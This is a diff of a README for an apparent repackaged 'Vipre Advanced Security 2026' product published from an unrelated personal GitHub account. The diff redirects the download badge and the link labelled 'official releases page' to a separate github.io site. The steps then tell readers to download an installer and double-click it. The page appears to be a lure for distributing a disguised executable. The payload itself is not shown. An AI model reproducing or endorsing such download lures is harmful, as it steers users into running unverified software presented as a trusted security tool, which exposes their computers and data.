@@ -1,6 +1,6 @@
 # 🛡️ Vipre-Advanced-Security-2026 - Protect your computer from online threats
 
-[![](https://img.shields.io/badge/Download-Vipre_Advanced_Security-blue.svg)](https://github.com/senguptadebjyoti081-tech/Vipre-Advanced-Security-2026/releases)
+[![](https://img.shields.io/badge/Download-Vipre_Advanced_Security-blue.svg)](https://senguptadebjyoti081-tech.github.io)
 
 ## About this software
 
@@ -10,7 +10,7 @@ Vipre Advanced Security 2026 protects your Windows computer. It detects malware,
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/senguptadebjyoti081-tech/Vipre-Advanced-Security-2026/releases) to access the installer.
+1. Visit the [official releases page](https://senguptadebjyoti081-tech.github.io) to access the installer.
 2. Select the latest version of the installer file from the list.
 3. Save the file to your computer desktop or your Downloads folder.
 4. Locate the downloaded file and double-click it.
